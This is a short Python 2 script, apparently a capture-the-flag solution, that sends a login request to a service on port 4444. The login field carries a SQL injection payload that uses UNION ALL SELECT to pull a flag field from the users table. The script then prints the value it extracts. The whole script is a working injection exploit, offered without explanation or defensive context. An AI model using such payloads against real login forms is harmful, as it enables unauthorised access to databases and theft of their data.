#!/usr/bin/env python2

import argparse
import requests
import sys
import re

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('host', metavar='host', type=str)

    args = parser.parse_args()

    url = 'http://{}:4444'.format(args.host)
    password = '0.208070805713'
    sql = 'select flag_field from users where id=3;'

    POST = {
        'password': password
    }

    POST['login'] = '*/ OR id=0 UNION ALL SELECT flag_field from users where id=3;'

    r = requests.post(url, data = POST)
    m = re.findall('Welcome back ([^!]+)', r.text)
    print(m[0])

if __name__ == "__main__":
    main()
